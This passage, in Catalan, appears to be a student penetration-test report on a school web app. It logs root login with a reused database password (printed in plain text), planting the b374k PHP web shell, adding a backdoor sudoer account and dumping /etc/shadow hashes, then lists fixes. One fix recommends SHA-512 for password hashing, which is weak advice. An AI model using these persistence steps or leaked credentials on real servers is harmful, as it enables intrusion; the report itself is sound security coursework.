Last login: Sun Mar  5 14:20:24 2023 from 172.17.100.109
root@prioritask ~#
```

La contrasenya de root per SSH és la mateixa que la de l'usuari "adminer" de la base de dades (Bhun@89ble.oient).

**Acció 3:**

Persona --> Cristian
Temps --> 08/03/2023 --> 18:00
Acció --> Pujar una reverse shell
Endpoint --> 192.168.255.26
Resultat --> Hem aconseguit pujar una reverse shell amb èxit.
Output:

Ens connectem al servidor amb les credencials de root que tenim (Bhun@89ble.oient), creem un fitxer nou (hola.php) i enganxem el codi de la següent reverse shell --> https://github.com/backdoorhub/shell-backdoor-list/blob/master/shell/php/b374k.php
```
root@prioritask .../front/img# nano hola.php
root@prioritask .../front/img# stat hola.php 
  File: hola.php
  Size: 189882    	Blocks: 267        IO Block: 131072 regular file
Device: 9eh/158d	Inode: 76056       Links: 1
Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2023-03-08 17:11:28.734224325 +0000
Modify: 2023-03-08 17:11:16.758133203 +0000
Change: 2023-03-08 17:11:16.758133203 +0000
 Birth: 2023-03-08 17:11:16.758133203 +0000
```
L'hora del servidor és UTC, és una hora menys que la nostra.

He deixat al reverse shell a la següent ruta --> /var/www/front/img/hola.php
Per accedir a ella des de fora --> http://prioritask.daw.institutmontilivi.cat/img/hola.php

**Acció 4:**

Persona --> Cristian
Temps --> 08/03/2023 --> 19:25
Acció --> Crear un usari sudoer
Endpoint --> 192.168.255.26
Resultat --> Hem aconseguit crear un usuari i donar-li permisos de sudoer amb exit. 
Usuari --> cat 
passwd --> cat

Output:

```
root@prioritask .../front/img# adduser cat
Adding user `cat' ...
Adding new group `cat' (1001) ...
Adding new user `cat' (1001) with group `cat' ...
Creating home directory `/home/cat' ...
Copying files from `/etc/skel' ...
New password: 
Retype new password: 
passwd: password updated successfully
Changing the user information for cat
Enter the new value, or press ENTER for the default
	Full Name []: 
	Room Number []: 
	Work Phone []: 
	Home Phone []: 
	Other []: 
Is the information correct? [Y/n] y
root@prioritask .../front/img# cd
root@prioritask ~# nano /etc/sudoers
root@prioritask ~# cat /etc/sudoers | grep "cat "
cat    ALL=(ALL:ALL) ALL
root@prioritask ~#
```

```
(19:28:19)[mié mar 08]lao@parrot:$ ssh cat@192.168.255.26
cat@192.168.255.26's password: 
Welcome to Prioritask, TurnKey GNU/Linux 17.1 (Debian 11/Bullseye)

  System information for Wed Mar 08 18:30:30 2023 (UTC+0000)
  
    System load:  1.39              Memory usage:  26.0%
    Processes:    48                Swap usage:    0.0%
    Usage of /:   14.5% of 8.00GB   IP address for eth0: 172.17.100.114
                                    IP address for tun0: 192.168.255.26
  
  TKLBAM (Backup and Migration):  NOT INITIALIZED
  
    To initialize TKLBAM, run the "tklbam-init" command to link this
    system to your TurnKey Hub account. For details see the man page or
    go to:
  
        https://www.turnkeylinux.org/tklbam
  

    For Advanced commandline config run:    confconsole

  For more info see: https://www.turnkeylinux.org/docs/confconsole

Linux prioritask 5.15.30-2-pve #1 SMP PVE 5.15.30-3 (Fri, 22 Apr 2022 18:08:27 +0200) x86_64
cat@prioritask ~$
```
```
cat@prioritask ~$ sudo cat /etc/shadow

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for cat: 
root:$y$j9T$8TVOTqiJ.pxjzIsnWpVkX.$I0w3QqOdJDRwjgdIdP6DkXOZPTIUZzeRda7dzpAqqD6:19391:0:99999:7:::
daemon:*:19083:0:99999:7:::
bin:*:19083:0:99999:7:::
sys:*:19083:0:99999:7:::
sync:*:19083:0:99999:7:::
games:*:19083:0:99999:7:::
man:*:19083:0:99999:7:::
lp:*:19083:0:99999:7:::
mail:*:19083:0:99999:7:::
news:*:19083:0:99999:7:::
uucp:*:19083:0:99999:7:::
proxy:*:19083:0:99999:7:::
www-data:*:19083:0:99999:7:::
backup:*:19083:0:99999:7:::
list:*:19083:0:99999:7:::
irc:*:19083:0:99999:7:::
gnats:*:19083:0:99999:7:::
nobody:*:19083:0:99999:7:::
_apt:*:19083:0:99999:7:::
systemd-network:*:19103:0:99999:7:::
systemd-resolve:*:19103:0:99999:7:::
mysql:!:19103:0:99999:7:::
shellinabox:*:19103:0:99999:7:::
stunnel4:!:19103:0:99999:7:::
postfix:*:19103:0:99999:7:::
sshd:*:19103:0:99999:7:::
systemd-timesync:!*:19380::::::
systemd-coredump:!*:19380::::::
profedaw:$y$j9T$8nXBB/1ryzBzgQsvYOPGq/$fDtIkaav2OZWfbXgK7CQ51qRNq.WNZ7U8Hlo55Qmmg9:19421:0:99999:7:::
wazuh:*:19410:0:99999:7:::
cat:$y$j9T$uzxEJxPdOG8CkQpheVV4o.$Tq1h6.UkV1ovhuqtSpTQH4H84NL6P4RbMCacLYdY/q6:19424:0:99999:7:::
cat@prioritask ~$
```

**Conclusions:**

Hem aconseguit ser root del servidor gracies a que la contrasenya de la bdd es la mateixa de l'usuari root, per tant tenim acces total al servidor i a l'aplicacio. El servidor està totalment compromès i podem realitzar qualsevol acció sobre d'aquest, a part tenim accés total a la base de dades. Cal comentar que per cometre aquest atac es necessita un alt nivell de coneixements fora de l'abast de l'usuari general, però s'hauran d'aplicar mesures per tancar els forats de seguretat.

## Fix

**Code leaked**

El codi del projecte l'hem trobat fent osint del developer Luis Meza al github, tot el codi està en un repositori públic. Per solucionar el problema s'ha de fer que el repositori del projecte sigui privat en lloc de ser públic.

**DB password**

El password de la base de dades està en text pla a dins del codi. Per solucionar aquest problema el més recomanable és utilitzar variables d'entorn per emmagatzemar totes les contrasenyes i incloure els fitxers que guarden aquestes variables (.env) al gitignore.

**Directory listing**

Els directoris "/css/" i "/js/" tenen la directiva "Options Indexes FollowSymLinks  Multiviews" de l'Apache activada, això permet a qualsevol persona veure el seu contingut i visualitzar el contingut dels fitxers. Per solucionar aquesta vulnerabilitat s'ha de crear un fitxer ".htacces" a cada una de les carpetes amb la directiva "-Indexes" a la primera línia, així l'Apache ja no llistarà els directoris a través de la web. Com a segona opció es pot modificar la directiva de configuració de l'Apache a "Options -Indexes FollowSymLinks MultiViews" en el fitxer del vhost o host per defecte.

**Broken acces control**

Aquesta vulnerabilitat permet a un usuari modificar el valor de la clau "rol" del local storage de l'aplicació i passar a ser un usuari administrador (sempre que fabriquis el token pertinent). Per solucionar aquesta vulnerabilitat s'ha de treure del local storage la clau "rol" i guardar-la únicament a la base de dades.

**Cryptographic Failures (MD5)**

Aquesta vulnerabilitat permet a un usuari desencriptar els hashos realitzats amb MD5, ja que aquest algoritme de xifratge és insegur. Per solucionar aquesta vulnerabilitat s'ha de fer servir un altre algoritme sense vulnerabilitats com el SHA-512.

**Security Missconfiguration**

Aquesta vulnerabilitat apareix quan es reutilitza una contrasenya en diferents parts del projecte, concretament s'ha utilitzat la mateixa contrasenya per la base de dades i per l'usuari root del servidor. Si un usuari aconsegueix la contrasenya de la base de dades també guanya accés a tot el servidor com a root. Per solucionar aquesta vulnerabilitat s'han d'utilitzar contrasenyes diferents i inclús és molt recomanable desactivar el login per SSH amb l'usuari root.

També cal comentar que el directori "/doc/" no està securitzat i un usuari qualsevol pot visualitzar totes les funcions amb els paràmetres d'aquestes. Per solucionar aquesta vulnerabilitat s'ha de posar un usuari i contrasenya per entrar al directori.

**Outdated Components**

Aquesta vulnerabilitat apareix quan no es tenen tots els programaris del servidor actualitzats a l'última versió, això pot permetre a un usuari explotar un forat de seguretat i entrat al servidor. Per solucionar aquesta vulnerabilitat s'ha d'actualitzar amb regularitat el servidor.

**Test Passed**

Aquesta vulnerabilitat apareix quan no existeixen tests unitaris que verifiquin el correcte funcionament de les funcionalitats de l'aplicació, fent que afegir nou codi es pugui perdre la "Disponibilitat" d'aquesta. Per solucionar aquesta vulnerabilitat s'han de realitzar tests unitaris de totes les funcionalitats del codi i no actualitzar-lo si no es passen els tests. 


